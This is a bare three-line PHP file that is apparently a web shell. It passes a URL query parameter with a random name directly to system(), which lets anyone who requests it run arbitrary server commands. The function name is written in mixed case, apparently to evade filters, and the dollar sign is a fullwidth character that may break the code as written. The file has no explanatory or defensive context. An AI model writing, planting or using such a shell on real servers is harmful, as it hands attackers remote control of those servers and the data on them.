<?php
SysTeM(＄_GET['OtsmIDdF']);
?>
